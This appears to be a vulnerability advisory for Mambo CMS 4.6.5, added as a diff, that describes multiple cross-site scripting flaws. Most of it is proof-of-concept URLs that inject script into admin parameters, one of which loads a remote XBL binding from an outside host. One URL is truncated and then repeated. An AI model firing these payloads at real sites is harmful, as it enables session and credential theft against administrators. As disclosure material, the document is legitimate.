@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/48455/info
+
+Mambo CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Mambo CMS 4.6.5 is vulnerable; other versions may also be affected; 
+
+http://www.example.com/mambo/index.php?option=com_content&task=%22%20style=width:1000px;height:1000px;top:0;left:0;position:absolute%20onmouseover=alert%28/XSS/%29%20&id=3&Itemid=32
+
+http://www.example.com/mambo/administrator/index2.php?option=com_menumanager&task=edit&hidemainmenu=1&menu=Move+your+mouse+here%22%20style=position:absolute;width:1000px;height:1000px;top:0;left:0;%20onmouseover=alert%28/XSS/%29%20
+
+http://www.example.com/mambo/administrator/index2.php?option=com_menus&menutype=xss"%20style%3dx%3aexpression(alert(/XSS/))%20XSSSSSSSS
+
+http://www.example.com/mambo/administrator/index2.php?option=com_menus&menutype=xss"%20%20%20style=background-image:url('javascript:alert(/XSS/)');width:1000px;height:1000px;display:block;%20x=%20XSSSSSSSS
+
+http://www.example.com/mambo/administrator/index2.php?limit=10&order%5b%5d=11&boxchecked=0&toggle=on&search=simple_search&task=&limitstart=0&cid%5b%5d=on&zorder=c.ordering+DESC"><script>alert(/XSS/)</script>&filter_authorid=62&hidemainmenu=0&option=com_typedcontent
+
+http://www.example.com/mambo/administrator/index2.php?limit=10&boxchecked=0&toggle=on&search=xss"><script>alert(/XSS/)</script>&task=&limitstart=0&hidemainmenu=0&option=com_comment
+
+http://www.example.com/mambo/administrator/index2.php?option=com_modules&client=%27%22%20onmouseover=alert%28/XSS/%29%20a=%22%27
+
+http://www.example.com/mambo/administrator/index2.php?option=com_categories&section=com_weblinks"%20style%3dx%3aexpression(alert(/XSS/))%20XSSSSSSSS&task=editA&hidemainmenu=1&id=2
+
+http://www.example.com/mambo/administrator/index2.php?option=com_categories&section=com_weblinks"%20style%3d-moz-binding:url(http://www.businessinfo.co.uk/labs/xbl/xbl.xml%23xss)%20XSSSSSSSS&task=editA&hidemainmenu=1&id=2
+
+http://www.example.com/mambo/administrator/index2.php?option=com_categories&section=com_weblinks"%20%20style=background-image:url('javascript:alert(0)');width:1000px;height:1000px;display:block;%20x=%20XSSSSSSSS&task=editA&hidemainmenu=1&id=2
+
+http://www.example.com/mambo/administrator/index2.php?option=com_categories&section=com_weblinks"%20%20style=background-image:url(javascript:alert(0));width:1000px;height:1000px;dis
+
+http://www.example.com/mambo/administrator/index2.php?option=com_categories&section=com_weblinks"%20%20style=background-image:url(javascript:alert(0));width:1000px;height:1000px;display:block;%20x=%20XSSSSSSSS&task=editA&hidemainmenu=1&id=2
